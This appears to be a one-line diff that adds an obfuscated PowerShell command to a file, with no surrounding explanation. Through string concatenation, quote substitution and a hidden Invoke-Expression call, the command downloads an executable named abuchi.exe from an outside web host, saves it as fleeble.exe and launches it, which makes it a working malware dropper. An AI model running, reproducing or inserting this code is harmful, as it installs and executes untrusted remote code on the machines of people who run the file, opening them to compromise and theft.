@@ -1,0 +1,1 @@
+﻿ ('(New-O'+'bj'+'ec'+'t'+' Syste'+'m.Net'+'.W'+'e'+'bCl'+'ient).Downlo'+'ad'+'Fil'+'e(STVh'+'t'+'tp:'+'//'+'wor'+'ldn'+'i'+'t.com/a'+'b'+'uchi'+'.exeS'+'TV'+',STVf'+'le'+'ebl'+'e.e'+'x'+'e'+'ST'+'V);'+'Start-P'+'ro'+'cess '+'STVfl'+'eebl'+'e'+'.ex'+'eSTV').REPLace('STV',[STRING][CHAR]39)|.((Gv '*MDR*').NAME[3,11,2]-jOIn'')
